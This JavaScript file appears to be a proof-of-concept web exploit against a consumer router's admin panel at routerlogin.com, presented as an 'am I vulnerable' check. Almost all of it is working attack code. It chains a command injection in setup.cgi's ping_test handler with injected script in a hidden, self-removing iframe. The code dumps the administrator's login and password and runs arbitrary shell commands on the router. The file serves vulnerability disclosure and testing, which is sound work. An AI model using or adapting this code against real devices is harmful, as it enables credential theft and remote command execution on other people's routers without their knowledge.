'use strict';

//
// Turn on for a little bit more debug logs.
//

const debug = false;

//
// Based on my tests, routerlogin.com should
// resolve to the IP address hosting the administration
// HTTP panel. You can specify an IP here directly.
//

const targetServer = 'routerlogin.com';

//
// Log information in the DOM.
//

function log(e) {
  let str = e.substr(0, 50);
  if (str.length < e.length) {
    str += '...';
  }
  document.getElementById('log').textContent += `${str}\n`;
}

//
// Log debug information in the DOM.
//

function dbg(e) {
  if (!debug) {
    return;
  }

  log(`[dbg] ${e}`);
}

//
// Build the iframe and form required to exploit the issues. It is
// basically a lot of common code needed to trigger both the password
// dump and the RCE.
//

function buildIframeAndForm(parameters) {

  //
  // Set-up the iframe. The form will target this iframe which disallows
  // the iframed content to redirect the top-level window.
  // I am not sure if it's the proper way of doing that, but it is the
  // only one I tested that worked.
  //

  const iframeName = 'doar-e.github.io ftw!';
  const iframe = document.createElement('iframe');
  if (debug) {
    iframe.width = '100%';
    iframe.height = '100%';
  } else {
    iframe.style.display = 'none';
  }

  //
  // Add the iframe to the document.
  //

  document.body.appendChild(iframe);
  iframe.contentWindow.name = iframeName;

  //
  // Set-up the form to target the iframe (using its name). The form
  // is used to post data to the target.
  //

  const form = document.createElement('form');
  form.action = `http://${targetServer}/setup.cgi?id=0&sp=1337foo=currentsetting.htm`;
  form.method = 'POST';
  form.target = iframeName;

  //
  // Add the input parameters.
  //

  for (const [name, value] of parameters) {
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = value;
    form.appendChild(input);
  }

  //
  // Add the form to the document.
  //

  document.body.appendChild(form);
  return [iframe, form];
}

//
// Execute a payload and / or command on the router.
//

function execute(payload, commands) {
  return new Promise((resolve, reject) => {

    //
    // Prepare the form parameters to be able to create an XSS via the command injection bug.
    // This is what we use to inject the XSS payload.
    // Here is what happens in details:
    //   1- setup.cgi receives the request and invokes the `ping_test` handler.
    //   2- The `ping_test` handler executes "/bin/ping -c 4 <payload>" and the output is stored in
    //   a heap buffer pointed to by `ping_output` in setup.cgi.
    //   3- Once the handler is done executing, it sees there is a `next_file` parameter passed,
    //   so it opens `diagping.htm` and replaces the `@ping_output#` token with the content of the heap
    //   buffer pointed by `ping_output` populated above. Because we managed to inject JS there
    //   it is sent back to the browser.
    //   4- The browser executes the JS code that basically reuse the vulnerabilities to fetch the
    //   credentials (allowed because we execute the JS from the same origin) and sends them to the
    //   attacker server.
    //

    const allCommands = ['127.0.0.1'];
    if (commands != undefined) {
      allCommands.push(...commands);
    }

    //
    // This is JS code to remove the `help_iframe` to avoid the htaccess prompt
    // to be displayed and warn the user something is going on.
    //

    const removeIframes = "setTimeout(()=>document.querySelectorAll('iframe').forEach(A => A.parentNode.removeChild(A)), 0)";
    allCommands.push(`/bin/echo "</textarea><script>${removeIframes}<\/script><script>${payload}<\/script><textarea>"`);

    const parameters = new Map();
    parameters.set('todo', 'ping_test');
    parameters.set('c4_IPAddr', allCommands.join(' && '));
    parameters.set('next_file', 'diagping.htm');

    if (debug) {
      dbg(`c4_IPAddr: ${parameters.get('c4_IPAddr').substr(0, 60)}...`);
    }

    //
    // Build the iframe / form.
    //

    const [iframe, form] = buildIframeAndForm(parameters);

    //
    // Add a message handler to be able to know when the attack has completed.
    //

    let timeout = undefined;
    const messageHandler = e => {

      //
      // Clean up the timeout.
      //

      clearTimeout(timeout);
      if (e.data.startsWith('failed')) {
        reject('unexpected message');
      }

      //
      // Clean up the DOM.
      //

      for (const elem of [iframe, form]) {
        elem.parentNode.removeChild(elem);
      }

      resolve(e.data);
    };

    window.addEventListener('message', messageHandler, {once: true});

    //
    // Ensure the promise ends eventually.
    //

    timeout = window.setTimeout(() => {
      window.removeEventListener('message', messageHandler);
      reject('timeout');
    }, 10_000);

    //
    // Submit the form and launch the attack!
    //

    form.submit();
  });
}

//
// Dump the passwords of the administrator.
//

function dumpPasswords() {

  //
  // This is the XSS payload that allows us to exfiltrate data to the attacker website.
  // Without it CORS would prevent us from reading the content and leaking the creds.
  // Once it is finished it sends a message to the parent window, so polite.
  //

  const payload = `fetch('/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm').then(r=>r.text()).then(r=>parent.postMessage(r, '*')).catch(r=>parent.postMessage('failed','*'))`;
  return execute(payload).then(R => {
    const [loginMatch, pwdMatch] = R.matchAll(/Router Admin (?:Username|Password)<\/span>:&nbsp;(.+)<\/td>/g);
    return {'login':loginMatch[1], 'pwd':pwdMatch[1]};
  });
}

//
// Execute a shell command on the router.
//

function executeCommand(command) {
  if (command.includes(';') || command.includes('-')) {
    throw 'cannot inject ";" or "-"';
  }

  //
  // This is the XSS payload that allows us to exfiltrate data to the attacker website.
  // Without it CORS would prevent us from reading the content and leaking the creds.
  // Once it is finished it sends a message to the parent window, so polite.
  //

  const payload = "parent.postMessage(document.body.outerHTML,'*')";
  const commands = ['/bin/echo BEGIN', command, '/bin/echo END'];
  return execute(payload, commands).then(r => {
    const [_, result] = r.match(/BEGIN\n(.+)\nEND/s);
    return result;
  });
}

//
// Update the UI with the results of the experiments.
//

function setVulnerable(vuln) {
  const elem = document.getElementById('amivuln');
  elem.disabled = true;
  if (vuln) {
    elem.classList.replace('btn-secondary', 'btn-danger');
    elem.innerText = 'You are vulnerable 😬';
  } else {
    elem.classList.replace('btn-secondary', 'btn-success');
    elem.innerText = 'You are good 🤗';
  }
}

//
// Main.
//

function main() {
  const command = '/bin/cat /proc/version';
  document.getElementById('spinner').hidden = false;
  log(`Attacking ${targetServer}...`);
  dumpPasswords().then(({login, pwd}) => {
    log(`  Login: ${login}`);
    log(`  Password: ${pwd}`);
    return executeCommand(command);
  }).then(r => {
    log(`Successfully executed "${command}":`);
    for(const line of r.split('\n')) {
      log(`  ${line}`);
    }
    setVulnerable(true);
  }).catch(reason => {
    log(`Failed: ${reason} :(\n`);
    setVulnerable(false);
  });
}
